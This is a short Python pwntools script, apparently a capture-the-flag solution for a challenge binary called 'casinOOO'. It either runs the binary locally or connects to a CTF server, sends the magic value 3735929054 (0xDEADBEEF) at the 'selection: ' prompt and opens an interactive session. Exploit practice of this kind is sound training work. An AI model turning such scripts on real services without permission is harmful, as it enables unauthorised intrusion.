#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('casinOOO', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('ctf.asuhacking.club', 26)
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

sl(str(3735929054).encode(), b'selection: ')
p.interactive()

